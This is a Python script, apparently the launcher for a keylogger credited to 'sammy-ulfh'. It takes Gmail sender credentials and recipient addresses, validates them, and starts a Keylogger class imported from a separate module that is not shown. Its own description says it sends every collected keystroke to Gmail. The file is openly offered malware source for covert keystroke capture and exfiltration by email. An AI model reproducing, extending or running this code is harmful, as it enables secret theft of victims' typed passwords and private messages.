#!/usr/bin/env python3

import signal
import argparse
import os
import re

from keylogger import Keylogger
from termcolor import colored

keylogger = None

def def_handler(sig, frame):
    global keylogger
    print(colored("\n[!] Quitting the program...\n", "red"))
    keylogger.shutdown()
    os._exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    argparser = argparse.ArgumentParser(description="Keylogger that sends all collected keys to a Gmail.")
    argparser.add_argument("-s", "--sender", required=True, dest="sender", help="Gmail as sender. (Ex: sender@gmail.com)")
    argparser.add_argument("-r", "--recipients", required=True, dest="recipients", help="Recipients Gmail separated by a comma. (Ex: 'sender@gmail.com' | 'sender@gmail.com,sender1@gmail.com')")
    argparser.add_argument("-p", "--password", required=True, dest="password", help="Password used by the sender in the application. (Ex: jklo oikj aswer)")

    args = argparser.parse_args()

    return args.sender, args.password, args.recipients

def verify_format(sender, recipients):
    emailRegex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,63}$'
    recipients = recipients.split(',')
    rec = recipients
    recipientsMatch = map(lambda recipt: re.match(emailRegex, recipt), recipients)

    for recipient in recipientsMatch:
        if not recipient:
            recipientsMatch = False
            break
    else:
        recipientsMatch = True

    senderMatch = re.match(emailRegex, sender)

    return recipientsMatch and senderMatch, rec

def print_banner():
    print(colored("""
█▄▀ █▀▀ █▄█ █░░ █▀█ █▀▀ █▀▀ █▀▀ █▀█
█░█ ██▄ ░█░ █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄\n""", 'white'))

    print(colored("""Mᴀᴅᴇ ʙʏ sᴀᴍᴍʏ-ᴜʟғʜ\n""", 'yellow'))

def main():
    global keylogger

    print_banner()
    sender, password, recipients = get_arguments()
    isValid, recipients = verify_format(sender, recipients)

    if isValid:
        keylogger = Keylogger(sender, password,recipients)
        keylogger.start()
    else:
        print(colored("\n[!] Incorrect argument format.\n", "red"))

if __name__ == "__main__":
    main()
